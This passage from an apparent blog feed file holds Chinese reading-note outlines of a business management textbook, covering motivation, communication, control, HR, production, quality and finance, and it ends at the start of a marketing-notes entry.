工作的独立性 * 工作扩大化 * 工作丰富化</li><li>奥尔德弗的ERG 理论<ul><li>ERG 理论<ul><li>存在需要</li><li>关系需要</li><li>成长需要</li></ul></li><li>特点<ul><li>ERG 理论并不强调需要层次的顺序</li><li>ERG 理论认为，当较高级的需要受到挫折，未能得到满足时，会产生倒退现象，而不是像马斯洛所指出的那样，继续努力去追求受挫折需要的满足。</li><li>ERG 理论主张某种需要尤其是关系忐要和成长需要，在得到了基本满足之后，其强烈的程度不仅不会减弱，往往更为增强。这种情况与马斯洛所说的情况正好相反。</li></ul></li></ul></li><li>麦克利兰的高级需要理论<ul><li>权力需要</li><li>合群需要</li><li>成就需要</li></ul></li></ul></li><li>过程型激励理论<ul><li>期望理论</li><li>公平理论</li><li>强化理论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_39.bmp"></li></ul></li><li>综合型激励理论 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_40.bmp"></li><li>激励理论的应用原则<ul><li>物质激励与精神激励相结合</li><li>外激励与内激励相结合</li><li>正激励与负激励相结合</li><li>个人目标与企业目标相结合</li><li>按需激励</li><li>民主公正</li></ul></li><li>精神激励的主要方式<ul><li>目标激励</li><li>感情激励</li><li>榜样激励</li><li>评比、竞赛、竞争激励</li><li>强化激励</li><li>领导行为激励</li><li>员工持股激励</li><li>危机激励</li><li>企业文化激励</li></ul></li></ul></li><li>沟通<ul><li>沟通的基本模式<ul><li>沟通的涵义</li><li>信息沟通的类型<ul><li>按信息流向划分：自上而下沟通、自下而上沟通、左右交叉沟通</li><li>按信息传递途径划分；正式沟通与非正式沟通</li><li>按信息传递方式划分： 口头沟通、书面沟通和非语吉沟通</li><li>按信息传递范闱划分：组织内部沟通和组织外部沟通</li></ul></li><li>沟通过程<ul><li>沟通主体</li><li>编码</li><li>媒体</li><li>沟通的客体</li><li>译码</li><li>反馈<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_41.bmp"></li></ul></li></ul></li><li>沟通障碍与有效沟通<ul><li>沟通障碍<ul><li>自然原因造成的沟通障碍</li><li>管理因素造成的沟通障碍</li><li>技能因素造成的沟通障碍</li></ul></li><li>有效沟通的特征<ul><li>及时</li><li>充分</li><li>不失真</li></ul></li><li>有效沟通的原则<ul><li>明确沟通目的</li><li>信息的选择、生成要慎重</li><li>选择方便、快捷、节约、高效的传递方式</li><li>增强沟通技能</li><li>及时反馈</li></ul></li><li>沟通技巧<ul><li>说的技巧</li><li>写的技巧</li><li>倾听的技巧</li></ul></li></ul></li><li>冲突<ul><li>冲突的种类<ul><li>个体与个体冲突</li><li>个体与群体冲突</li><li>群体间冲突</li><li>组织内冲突</li><li>角色冲突</li><li>组织间冲突</li></ul></li><li>冲突处理策略<ul><li>回避策略<ul><li>不予注意</li><li>分开或隔离</li><li>限制相互作用</li></ul></li><li>缓解策略<ul><li>平滑</li><li>妥协</li></ul></li><li>正视策略<ul><li>面对面会议</li><li>角色互换</li><li>高层次目标</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="第6章-管理的控制职能"><a href="#第6章-管理的控制职能" class="headerlink" title="第6章 管理的控制职能"></a>第6章 管理的控制职能</h3><ul><li>控制类型<ul><li>管理控制的目标与特点<ul><li>管理控制的概念</li><li>管理控制的目标<ul><li>限制偏差的累积</li><li>适应坏境的变化</li><li>处理组织内部的复杂局面</li><li>降低成本</li></ul></li><li>管理控制的特点<ul><li>整体性</li><li>动态性</li><li>能动性</li></ul></li></ul></li><li>控制的内容和控制的要求<ul><li>控制的内容<ul><li>对人员的控制</li><li>对财务的拧制</li><li>对作业的控制</li><li>对信息的拧制</li><li>对企业绩效的控制</li></ul></li><li>有效控制的要求<ul><li>目的性</li><li>全局性</li><li>时效性</li><li>经济性</li><li>关键控制点与例外情况</li></ul></li></ul></li><li>控制的类型<ul><li>反馈控制、实时控制与前馈控制</li><li>正式组织控制、非正式组织控制和自我控制</li><li>直接控制和间接控制</li></ul></li></ul></li><li>控制过程<ul><li>确定控制标准 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_42.bmp"> <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_43.bmp"> * 标准的概念 * 标准的分类 * 选择关键控制点</li><li>衡量工作绩效<ul><li>如何衡量和衡量方法<ul><li>个人观察</li><li>统计报告（报表）</li><li>口头汇报</li><li>书面报告</li></ul></li><li>衡量什么</li><li>如何衡量<ul><li>衡量工作绩效是以预定标准为衡量依据的</li><li>衡量、检验、鉴证工作的方法</li><li>确定适量的衡量频度（衡量次数）</li><li>设立高效、有序的信息反馈系统</li></ul></li></ul></li><li>纠正偏差<ul><li>偏差分类<ul><li>正偏差</li><li>零偏差</li><li>负偏差</li></ul></li><li>寻找主因和寻找主要偏差</li><li>偏差产生原因<ul><li>标准错误。</li><li>标准制定时的假设前提和预测环境发生变化。</li><li>无合适的规程、工艺、指令等。</li><li>员工综合素质不合要求。</li><li>企业竞争力下降。</li><li>顾客爱好、忐求和市场情况发生变化。</li><li>前、后道工序发生变化。</li><li>劳动纪律、工作纪律有松懈现象等。</li></ul></li><li>确定纠偏对象<ul><li>企业的某项活动。</li><li>组织系统中某一环节、某一技术和某道工序。</li><li>组织某项活动的计划方案和衡量标准。</li><li>企业的外部环境、产品市场的某些条件等。</li></ul></li><li>选择适当的纠偏措施</li></ul></li></ul></li><li>控制技术与方法<ul><li>专项控制与综合控制<ul><li>审计法 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_44.bmp"> * 财务审计 * 审计检查方法 * 审计调查法 * 审计分析法 * 抽样审计法 * 业务审计 * 管理审计</li><li>利润（损益）控制法</li><li>投资报酬率控制</li></ul></li><li>预算控制方法<ul><li>预算的概念</li><li>预算的种类<ul><li>传统预算</li><li>全面预算<ul><li>经营预算</li><li>财务预算</li><li>专门决策预算</li></ul></li><li>固定预算</li><li>弹性预算</li><li>零基预算</li><li>滚动预算</li><li>概率预算</li><li>长期预算</li><li>短期预算</li></ul></li><li>有效预算控制的要求<ul><li>要编好预算</li><li>高层管理部门要重视、支持并参与预算工作</li><li>确定各种标准</li><li>信息及时反馈</li></ul></li></ul></li><li>非预算控制方法<ul><li>现场观察</li><li>统计数据资料</li><li>专题报告法</li><li>本量利分析</li><li>财务报表分析<ul><li>变现能力比率</li><li>资产管理比率</li><li>负债比率</li><li>赢利能力比率</li></ul></li><li>目标管理</li><li>网络计划技术<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_45.bmp"></li></ul></li></ul></li></ul><h2 id="第三篇、管理实务篇"><a href="#第三篇、管理实务篇" class="headerlink" title="第三篇、管理实务篇"></a>第三篇、管理实务篇</h2><h3 id="第7章-人力资源管理"><a href="#第7章-人力资源管理" class="headerlink" title="第7章 人力资源管理"></a>第7章 人力资源管理</h3><ul><li>人力资源管理概述<ul><li>人力资源的特点<ul><li>能动性</li><li>两重性</li><li>时效性</li><li>社会性</li></ul></li><li>人力资源管理思想的发展<ul><li>人力资源管理思想的发展 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_46.bmp"></li><li>人力资源管理的基本职能 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_47.bmp"></li></ul></li></ul></li><li>员工招聘<ul><li>员工招聘程序<ul><li>招聘决策<ul><li>招聘决策应遵循下列原则：<ul><li>少而精原则</li><li>宁缺勿滥原则</li><li>公平竞争原则</li></ul></li><li>招聘决策的一般运作程序是：<ul><li>用人部门提出申请</li><li>人力资源管理部门复核</li><li>最高管理层决定</li></ul></li></ul></li><li>发布招聘信息<ul><li>广泛性</li><li>及时性</li><li>层次性</li></ul></li><li>招聘测试<ul><li>挑选合格的员工</li><li>让适当的人担任适当的工作</li><li>体现公平竞争原则</li></ul></li><li>人事决策<ul><li>重在工作能力</li><li>优先工作动机</li><li>不要用资历条件过高的人</li><li>当你对候选人缺乏足够信心时，不要将就</li><li>限制参加决策的人选，以避免难以协调意见</li><li>如经上述步骤仍无法确定人选，可再作一次测验</li></ul></li></ul></li><li>员工招聘渠道<ul><li>内部选拔<ul><li>内部提升</li><li>内部调用</li></ul></li><li>搜集网络信息<ul><li>熟人介绍</li><li>职业介绍机构</li><li>职业招聘人员</li><li>求职者登记</li></ul></li><li>公开招聘<ul><li>刊登广告</li><li>报名</li><li>招聘测试</li><li>筛选</li><li>录用</li><li>招聘评定<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_48.bmp"></li></ul></li></ul></li><li>员工招聘测评<ul><li>知识考试</li><li>面试</li><li>心理测试<ul><li>要对个人的隐私加以保护</li><li>心理测试以前，要先做好预备工作</li><li>主试要事先作好充分的准备</li></ul></li><li>情景模拟<ul><li>公文处理</li><li>与人谈话<ul><li>电话谈话</li><li>接待来访者</li><li>拜访有关人士</li></ul></li><li>无领导小组讨论</li><li>角色扮演</li><li>即席发言</li></ul></li></ul></li></ul></li><li>员工培训与开发<ul><li>培训与开发的重要性<ul><li>适应环境的变化</li><li>满足市场竞争的需要</li><li>满足员工自身发展的需要</li><li>提高企业的效益</li></ul></li><li>培训系统模型 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_49.bmp"> * 培训需求的确定 * 组织分祈 * 工作分析 * 个人分析 * 培训目标的设置 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_50.bmp"> * 培训计划的拟定 * 培训活动的实施 * 总结评估</li><li>培训与开发的原则<ul><li>学以致用</li><li>技能和素质综合提高</li><li>全员培训和重点突出结合</li><li>提高培训的投入产出比<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_51.bmp"></li></ul></li><li>培训与开发的形式<ul><li>在职培训<ul><li>学徒制培训</li><li>工作指导培训</li><li>工作轮换</li><li>挂职锻炼</li><li>自学<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_52.bmp"></li></ul></li><li>脱产培训<ul><li>分层次脱产培训<ul><li>强调培训对象的职务地位、等级和层次</li><li>强调标准化、规范化培训</li><li>具有定期轮训的特性</li></ul></li><li>专业脱产培训<ul><li>强调培训的专业性</li><li>强调专业知识和技能的层次</li><li>强调培训的适应性和未来性<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_53.bmp"></li></ul></li></ul></li></ul></li></ul></li><li>绩效考核<ul><li>绩效考核与管理的目的<ul><li>绩效的性质<ul><li>多因性 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_54.bmp"></li><li>多维性</li><li>动态性</li></ul></li><li>绩效考核与管理的目的<ul><li>检查和改进员工现有工作绩效</li><li>绩效考核是人员任用的依据</li><li>绩效考核是人员调配和职务升降的依据</li><li>绩效考核是人员培训的依据</li><li>绩效考核是确定员工报酬的依据</li><li>绩效考核是激励的依据，也是激励的手段</li></ul></li></ul></li><li>员工绩效考核的主要内容<ul><li>德。“德”，是评价考核员工的首要标准，具体包括政治品质、思想作风、个人品质和职业道德等</li><li>能。“能”，主要是指员工的能力，就是人的素质的外在表现，是一个人认识和改造世界的本领</li><li>勤。“勤”，主要反映员工的工作态度，包括纪律性、协调性、积极性和创造性等四个方面</li><li>绩。”绩”, 主要是指员工的工作业绩，是一个人为组织完成的工作数量、质量、经济效益和社会效益</li></ul></li><li>绩效考核的主要方法<ul><li>常规方法<ul><li>排序法</li><li>配对比较法</li><li>等级分配法</li></ul></li><li>行为评价法<ul><li>量表评等法</li><li>关键事件法</li><li>行为评等法</li><li>混合标准评等法</li></ul></li><li>原则<ul><li>最佳体现组织目标和考核目的；</li><li>对员工的工作起到开面引导和激励作用；</li><li>能比较客观地评价员ll作；</li><li>考核方法相对比较节约成本；</li><li>考核方法实践性强，易于执行。</li></ul></li></ul></li><li>绩效考核体系 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_55.bmp"> * 直接主管考评 * 同事互评 * 下属考评 * 相关部门或人员考评 * 自我考评</li><li>影响绩效考核的因素<ul><li>绩效考评系统本身原因<ul><li>考评标准的信度问题</li><li>绩效考评中的效度问题</li><li>考评方法的选择</li><li>考评结果的反馈</li></ul></li><li>考评人员的原因<ul><li>以偏概全</li><li>评价尺度不统一</li><li>近因效应</li><li>第一印象</li><li>情感和偏见</li></ul></li><li>被考评人的原因</li></ul></li></ul></li><li>薪酬管理<ul><li>薪酬形式<ul><li>基本工资</li><li>激励工资<ul><li>投入激励工资</li><li>产出激励工资</li><li>长期激励</li></ul></li><li>福利<ul><li>非工作时间报酬<ul><li>工作日内的休息时间</li><li>每周休假</li><li>节假日</li><li>探亲假</li><li>年休假</li><li>事假</li></ul></li><li>津贴<ul><li>交通津贴</li><li>节日津贴</li><li>住房津贴</li><li>其他津贴</li></ul></li><li>服务</li></ul></li><li>社会保险<ul><li>养老保险</li><li>医疗保险</li><li>工伤保险</li><li>失业保险</li><li>生育保险</li></ul></li></ul></li><li>薪酬制度的设计<ul><li>建立合理薪酬制度的原则<ul><li>公平性<ul><li>外部公平性</li><li>内部公平性</li><li>个人公平性</li></ul></li><li>竞争性</li><li>激励性</li><li>经济性</li><li>合法性</li></ul></li><li>薪酬制度设计应考虑的因素<ul><li>内部因素<ul><li>劳动者的劳动</li><li>职务的高低</li><li>技术与训练水平</li><li>工作的时间性</li><li>工作的危险性</li><li>福利及优惠权利</li><li>年龄与工龄</li></ul></li><li>外部因素<ul><li>生活费用与物价水平</li><li>企业的负担能力</li><li>地区与行业间通行的薪酬水平</li><li>劳动力市场的供求状况</li><li>劳动力市场的潜在替代物</li><li>产品的需求弹性</li><li>风俗习惯</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="第8章-生产与运作管理"><a href="#第8章-生产与运作管理" class="headerlink" title="第8章 生产与运作管理"></a>第8章 生产与运作管理</h3><ul><li>生产过程<ul><li>生产过程及其构成<ul><li>生产与生产过程的概念 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_56.bmp"></li><li>生产过程的构成<ul><li>生产技术准备过程</li><li>基本生产过程</li><li>辅助生产过程</li><li>生产服务过程<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_57.bmp"></li></ul></li><li>合理组织生产过程的基本要求<ul><li>连续性</li><li>平行性</li><li>比例性</li><li>均衡性</li><li>适应性</li></ul></li></ul></li><li>生产类型<ul><li>按产品需求特性划分<ul><li>订货型生产(Make - to - stock, MTS).</li><li>备货型生产(Make - to - order, MTO)</li></ul></li><li>按生产的工艺特征划分<ul><li>流程型生产</li><li>加工装配型生产</li></ul></li><li>按生产的重复性和稳定性划分<ul><li>大量生产</li><li>成批生产</li><li>单件生产<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_58.bmp"></li></ul></li></ul></li><li>生产过程组织的基本形式<ul><li>工艺专业化</li><li>对象专业化</li></ul></li></ul></li><li>生产计划<ul><li>生产计划<ul><li>生产计划的三个层次<ul><li>综合计划<ul><li>产品</li><li>时间</li><li>人员</li></ul></li><li>主生产计划</li><li>物料需求计划</li></ul></li><li>生产计划的主要指标<ul><li>品种指标</li><li>质量指标</li><li>产量指标</li><li>产值指标<ul><li>商品产值</li><li>总产值</li><li>净产值</li></ul></li></ul></li><li>产品生产进度的安排<ul><li>大量大批生产企业产品生产进度的安排<ul><li>平均分配</li><li>分期递增</li><li>小幅度连续递增</li><li>抛物线形递增</li></ul></li><li>成批生产企业产品生产进度安排</li><li>单件小批生产企业产品生产进度安排</li></ul></li></ul></li><li>生产作业计划<ul><li>作业计划标准<ul><li>批量和生产间隔期</li><li>生产周期</li><li>生产提前期</li><li>在制品定额</li></ul></li><li>生产作业计划的编制<ul><li>在制品定额法</li><li>提前期法</li><li>生产周期法</li></ul></li></ul></li><li>物料需求计划和企业资源计划<ul><li>物料需求计划(MRP)</li><li>制造资源计划(MRPII) <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_59.bmp"> * 计划的一贯性与可行性 * 管理的系统性 * 数据共享性 * 动态应变性 * 模拟预见性 * 物流．资金流的统一</li><li>企业资源计划(ERP)<ul><li>体现对整个供应链资源进行管理的思想</li><li>体现精益生产、同步工程和敏捷制造的思想</li><li>体现事先计划与事中控制的思想</li></ul></li></ul></li></ul></li><li>物资管理<ul><li>物资消耗定额<ul><li>净重</li><li>工艺性损耗</li><li>非工艺性损耗</li></ul></li><li>物资储备定额<ul><li>经常储备定额</li><li>保险储备定额</li><li>季节性储备定额。</li></ul></li><li>库存控制<ul><li>库存及库存控制的任务<ul><li>保障生产供应</li><li>控制生产系统的工作状态</li><li>降低生产成本</li></ul></li><li>库存控制的基本决策<ul><li>基本决策<ul><li>两次订货的间隔时间的确定</li><li>每次订货的订货批量的确定</li><li>每次订货提前期的确定</li><li>库存控制程度的确定，如满足用户需求的服务水平。库存控制决策的目标是在企业现有资源约束下，用最低的库存成本满足预期的需求。</li></ul></li><li>影响因素<ul><li>需求特性因素</li><li>订货提前期</li><li>自制与外购</li><li>服务水平</li></ul></li></ul></li><li>库存成本<ul><li>订货成本</li><li>调整成本</li><li>保管成本</li><li>购置成本</li><li>缺货成本</li></ul></li><li>库存控制的基本方式<ul><li>连续检查控制方式</li><li>周期检查控制方式</li></ul></li><li>库存重点控制方法——ABC 分析法<ul><li>A 类物料的库存控制方式</li><li>C 类物料的库存控制方式</li><li>B 类物料的库存控制方式</li></ul></li><li>经济订货批量模型 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_60.bmp"></li></ul></li><li>供应链管理 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_61.bmp"></li></ul></li><li>设备综合管理<ul><li>设备综合管理的涵义</li><li>设备购置的评价<ul><li>设备购置的技术性评价<ul><li>生产性</li><li>可靠性</li><li>维修性</li><li>安全性</li><li>节约性</li><li>环保性</li><li>成套性</li><li>适应性</li><li>耐用性</li></ul></li><li>设备购置的经济性评价<ul><li>投资回收期法</li><li>年费用法</li><li>现值法</li></ul></li></ul></li><li>设备磨损规律<ul><li>设备磨损<ul><li>有形磨损又称物理磨损</li><li>无形磨损又称精神磨损</li></ul></li><li>设备磨损规律 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_62.bmp"></li></ul></li><li>设备故障规律<ul><li>设备故障<ul><li>突发性故障</li><li>渐发性故障</li></ul></li><li>设备故障规律 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_63.bmp"></li></ul></li><li>设备的维护与修理<ul><li>设备的维护<ul><li>设备维护保养制度<ul><li>设各的日常维护保养</li><li>一级保养</li><li>二级保养</li></ul></li><li>点检制</li></ul></li><li>设备的修理<ul><li>设备修理类别<ul><li>小修</li><li>中修</li><li>大修</li></ul></li><li>设备维修制度<ul><li>计划预修制</li><li>计划保修制</li><li>预防维修制</li></ul></li></ul></li></ul></li><li>设备更新<ul><li>设备寿命<ul><li>设备的物理寿命</li><li>设备的技术寿命</li><li>设备的经济寿命</li><li>设备的折旧寿命</li></ul></li><li>设备更新周期<ul><li>效能衰退</li><li>技术陈旧落后</li><li>资金成本</li></ul></li><li>设备更新的方式<ul><li>原型更新</li><li>技术更新</li></ul></li><li>设备的技术改造</li></ul></li></ul></li><li>先进生产系统<ul><li>准时制生产（JIT）<ul><li>采用变“推”为“拉”的“反工序法”</li><li>强调下“求”上“供”，准时生产．按时交付，避免积压</li></ul></li><li>精益生产方式（LP）<ul><li>以简化为手段去除生产中一切不增值的工作</li><li>强调人的作用，充分发挥人的潜力</li><li>采用适度自动化，提高生产系统的柔性</li><li>不断改进，以尽善尽美为最高目标</li></ul></li><li>敏捷制造（AM）<ul><li>从产品开发到产品生产周期的全过程满足用户要求</li><li>采用多变的动态组织结构</li><li>战略着眼点在于长期获取经济效益</li><li>建立新型的标准基础结构，实现技本、管理和人的集成</li><li>最大限度地调动、发挥人的作用</li></ul></li><li>计算机集成制造系统（CIMS）<ul><li>CIMS 的内涵</li><li>CIMS 的功能组成 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_64.bmp"></li></ul></li></ul></li></ul><h3 id="第9章-质量管理"><a href="#第9章-质量管理" class="headerlink" title="第9章 质量管理"></a>第9章 质量管理</h3><ul><li>质量管理概述<ul><li>质量管理的相关概念<ul><li>产品的概念</li><li>质量的定义</li></ul></li><li>质量成本<ul><li>预防成本</li><li>鉴定成本</li><li>内部缺陷成本</li><li>外部缺陷成本</li></ul></li><li>质量管理的发展<ul><li>质皇检验阶段</li><li>统计质量控制(Statistical Quality Control) 阶段</li><li>全面质量管理阶段<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_65.bmp"></li></ul></li></ul></li><li>全面质量管理<ul><li>全面质量管理的特点<ul><li>全面质量管理的涵义</li><li>全面质量管理的特点<ul><li>全面质量管理的对象的全面性<ul><li>产品质量</li><li>工序质量</li><li>工作质量<img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_66.bmp"></li></ul></li><li>全面质量管理的过桯的全面性</li><li>全面质量管理的全员性</li><li>全面质量管理方法的全面性</li></ul></li></ul></li><li>全面质量管理的基本观点<ul><li>一切为了用户</li><li>以预防为主</li><li>用数据说话</li></ul></li><li>全面质量管理的内容<ul><li>设计开发过程质量管理<ul><li>建立、健全产品设计的工作程序</li><li>建立早期预警系统</li><li>运用科学的设计方法</li></ul></li><li>生产制造过程质量管理<ul><li>做好质量检验工作</li><li>组织和促进文明生产</li><li>组织质量分析</li><li>加强工序的质量控制</li><li>建立完善的质量监控体系</li></ul></li><li>辅助生产过程的质量管理<ul><li>物资供应的质量管理</li><li>设备的质量管理</li><li>工装量仪的质量管理</li></ul></li><li>使用服务过程的质量管理<ul><li>开展对用户的技术服务工作</li><li>认真处理客户投诉问题</li><li>做好产品质量信息的反馈分析工作</li></ul></li></ul></li><li>QC小组与PDCA<ul><li>QC 小组<ul><li>组成小组，确定组长</li><li>命名</li><li>分析问题，确定主题</li><li>确立目标，采用”5W2H” 来确立目标</li><li>制定工作计划，内容包括工作内容，进度、负责人、效果评价、举措等</li><li>找出问题的主要方面和原因分析</li><li>提出对策</li><li>对策实施</li><li>效果评价，效果评价良好则进入下一步骤，如果效果评价不好回到(7), 重新提出对策。</li><li>效果维持</li><li>总结发表成果</li></ul></li><li>POCA 工作循环 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_67.bmp"></li></ul></li></ul></li><li>ISO 9000系列标准<ul><li>ISO 9000系列标准的由来</li><li>ISO 9000系列标准的内容构成<ul><li>ISO 9000 族的核心标准 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_68.bmp"></li><li>与质量体系有关的基本术语 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_69.bmp"></li></ul></li><li>ISO 9000系列标准的适用性<ul><li>用千质量管理指南</li><li>合同清况，在第一方和第二方之间</li><li>第二方认定或注册</li><li>第三方认证或注册</li></ul></li><li>选择使用ISO 9000系列的两种方式<ul><li>受益者推动</li><li>管理者推动</li></ul></li><li>质量认证制度<ul><li>现代质量认证制度的由来</li><li>质量认证制度的含义<ul><li>产品和质量体系认证</li><li>认证机构的认可</li></ul></li><li>认证的要素和类型<ul><li>认证的要素<ul><li>型式试验</li><li>质量体系检查</li><li>监督检验</li><li>监督检查</li></ul></li><li>认证制度的分类<ul><li>自愿性认证和强制性认证</li><li>国家认证、区域认证和国际认证</li><li>合格标志认证和安全标志认证</li></ul></li><li>认证证书和认证标志</li></ul></li></ul></li><li>ISO 9000系列标准与TQM的关系</li></ul></li><li>质量管理的方法和技术<ul><li>统计分析表<ul><li>不合格项目表</li><li>缺陷位置表</li><li>不合格原因表</li><li>工序分布表</li><li>矩阵表</li></ul></li><li>分层法</li><li>排列图</li><li>因果分析图 <img src="/2018/11/05/2018-11-05-readingNoteModernBusinessManagement/2018_11_06_70.bmp"></li><li>散布图<ul><li>散布图做法<ul><li>收集数据</li><li>画出坐标图x.y 轴，并标出刻度</li><li>描点</li><li>判断</li></ul></li><li>数据关系通常有6 种基本形式<ul><li>正强相关</li><li>弱正相关</li><li>强负相关</li><li>弱负相关</li><li>不相关</li><li>非线性相关</li></ul></li></ul></li><li>直方图<ul><li>报告产品质量情况</li><li>质量分祈</li><li>判断质量问题成因</li><li>调查工序和设备能力，合理安排生产计划</li><li>定期绘制并分布，有较强的视觉冲击，有利于提高员工质量意识</li></ul></li><li>控制图</li></ul></li></ul><h3 id="第10章-财务管理"><a href="#第10章-财务管理" class="headerlink" title="第10章 财务管理"></a>第10章 财务管理</h3><ul><li>财务观念<ul><li>财务与财务管理目标观念<ul><li>财务的概念</li><li>财务管理</li><li>财务管理目标</li></ul></li><li>资金时间价值观念<ul><li>资金时间价值的概念</li><li>资金时间价值的计算方法<ul><li>复利终值和复利现值</li><li>年金</li></ul></li></ul></li><li>投资风险价值观念<ul><li>投资风险</li><li>风险的种类<ul><li>经营风险</li><li>财务风险</li></ul></li><li>风险的衡量</li><li>风险与报酬虳关系</li></ul></li></ul></li><li>筹资管理<ul><li>资本金及资本金制度<ul><li>资本金</li><li>资本金制度<ul><li>法定资本金</li><li>资本金的筹集期限</li><li>资本金管理原则</li><li>资本积累与储备制度</li></ul></li></ul></li><li>企业筹资方式<ul><li>吸收直接投资</li><li>发行股票<ul><li>股票的种类<ul><li>普通股和优先股</li><li>国家股、法人股，个人股和外资股</li><li>发起人股和吐会公众股</li><li>A 股、B 股和H 股</li></ul></li><li>股票的价格形式<ul><li>票面价值</li><li>账面价值</li><li>发行价格</li><li>市场价值</li><li>清算价值</li></ul></li><li>股票发行价格的确定</li><li>发行股票筹资的特点</li></ul></li><li>内部积累</li><li>银行借款<ul><li>长期借款与短期借款</li><li>银行借款的信用条件</li></ul></li><li>发行债券<ul><li>公司债券的发行条件</li><li>公司债的发行方式<ul><li>公募发行</li><li>私募发行</li></ul></li><li>债券的价值形式</li><li>债券发行价格的确定</li><li>发行债券筹资的特点</li></ul></li><li>融资租赁<ul><li>租赁的含义和种类</li><li>融资租赁的形式<ul><li>直接租赁</li><li>杠杆租赁</li><li>售后租赁</li></ul></li><li>融资租赁的优缺点</li></ul></li><li>商业信用<ul><li>商业信用的形式<ul><li>应付账款</li><li>商业汇票</li><li>预收货款</li><li>票据贴现</li></ul></li><li>商业信用的优缺点</li></ul></li></ul></li><li>资金成本<ul><li>资金成本的概念</li><li>个别资金成本的计算<ul><li>债券的资金成本</li><li>银行借款的资金成本</li><li>优先股的资金成本</li><li>普通股的资金成本</li><li>留存收益的资金成本</li></ul></li><li>综合资金成本</li></ul></li></ul></li><li>投资管理与决策<ul><li>投资项目的可行性研究<ul><li>可行性研究的步骤<ul><li>机会研究</li><li>初步可行性研究</li><li>详细可行性研究</li><li>评价和决策</li></ul></li><li>可行性研究的主要内容<ul><li>市场调查研究</li><li>原材料及供应的调查研究</li><li>厂址、布局的调杳研究</li><li>环境保护的调杳研究</li><li>项目技术设计的调查研究</li><li>顼目的经济评价</li></ul></li></ul></li><li>投资项目现金流量的估计</li><li>投资决策评价指标<ul><li>非贴现指标</li><li>贴现指标<ul><li>净现值</li><li>现值指数</li><li>内含报酬率</li></ul></li></ul></li></ul></li><li>利润管理<ul><li>利润构成<ul><li>营业利润</li><li>投资净收益</li><li>营业外收支净额</li></ul></li><li>税金<ul><li>流转税类：包括增值税、消费税、营业税和城市建设维护税。</li><li>资源税类：包括资源税、土地使用税、土地增值税。</li><li>所得税类：包括企业所得税、外商投资企业和外国企业所得税、个人所得税。</li><li>财产税类：包括房产税、车船税、遗产和赠与税。</li><li>行为税类：包括固定资产投资方向调节税、印花税、证券交易税、屠宰税。</li></ul></li><li>利润的分配顺序</li><li>股利政策<ul><li>剩余股利政策</li><li>固定股利政策</li><li>固定比例股利政策</li><li>正常股利加额外分红的股利政策</li></ul></li></ul></li><li>财务分析<ul><li>偿债能力分析<ul><li>流动比率</li><li>速动比率</li><li>即付比率</li><li>资产负债率</li><li>净资产负债率</li><li>利息保障倍数</li></ul></li><li>营运能力分析<ul><li>应收账款周转率</li><li>流动资产周转率</li><li>存货周转率</li></ul></li><li>赢利能力分析<ul><li>销售利润率</li><li>成本费用利润率</li><li>净资产利润率</li><li>总资产利润率</li></ul></li><li>财务分析综合练习</li></ul></li></ul>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————市场营销学第七版</title>
    <url>/2018/10/31/2018-10-31-readingNoteMarketing/</url>
    <content><![CDATA[<h1 id="市场营销原理第七版"><a href="#市场营销原理第七版" class="headerlink" title="市场营销原理第七版"></a>市场营销原理第七版</h1><h2 id="第一章、营销学基础"><a href="#第一章、营销学基础" class="headerlink" title="第一章、营销学基础"></a>第一章、营销学基础</h2><h3 id="营销的含义"><a href="#营销的含义" class="headerlink" title="营销的含义"></a>营销的含义</h3><ul><li>需要、欲望和需求</li><li>产品</li><li>价值、满意和质量</li><li>交换、交易和关系</li><li>市场</li><li>营销</li></ul><h3 id="营销管理"><a href="#营销管理" class="headerlink" title="营销管理"></a>营销管理</h3><ul><li>需求管理</li><li>建立互惠的顾客关系</li></ul><h3 id="营销管理哲学"><a href="#营销管理哲学" class="headerlink" title="营销管理哲学"></a>营销管理哲学</h3><ul><li>生产观念</li><li>产品观念</li><li>销售观念</li><li>营销观念</li><li>社会营销观念</li></ul><h3 id="下一世纪营销的挑战"><a href="#下一世纪营销的挑战" class="headerlink" 